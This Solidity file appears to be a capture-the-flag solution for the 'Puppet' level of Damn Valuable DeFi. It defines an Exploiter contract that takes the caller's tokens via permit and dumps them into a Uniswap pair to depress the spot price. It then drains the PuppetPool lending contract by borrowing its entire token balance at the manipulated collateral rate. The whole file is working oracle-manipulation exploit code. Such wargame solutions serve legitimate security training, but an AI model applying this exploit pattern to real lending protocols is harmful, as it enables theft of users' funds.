// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./PuppetPool.sol";

interface UniswapExchangeInterface {
    function tokenToEthTransferInput(uint256 tokens_sold, uint256 min_eth, uint256 deadline, address recipient)
        external
        returns (uint256 eth_bought);
}

contract Exploiter {
    PuppetPool private immutable puppetPool;
    DamnValuableToken private immutable token;
    UniswapExchangeInterface private immutable uniswapPair;

    constructor(address payable _puppetPoolAddress) {
        puppetPool = PuppetPool(_puppetPoolAddress);
        token = puppetPool.token();
        uniswapPair = UniswapExchangeInterface(puppetPool.uniswapPair());
    }

    function attack(uint256 deadline, uint8 v, bytes32 r, bytes32 s) external payable {
        token.permit(msg.sender, address(this), token.balanceOf(address(msg.sender)), deadline, v, r, s);
        token.transferFrom(msg.sender, address(this), token.balanceOf(address(msg.sender)));
        token.approve(address(uniswapPair), type(uint256).max);
        uniswapPair.tokenToEthTransferInput(token.balanceOf(address(this)), 1, deadline, msg.sender);
        uint256 amount = puppetPool.calculateDepositRequired(token.balanceOf(address(puppetPool)));
        puppetPool.borrow{value: amount}(token.balanceOf(address(puppetPool)), msg.sender);
        payable(msg.sender).call{value: address(this).balance}("");
    }
}
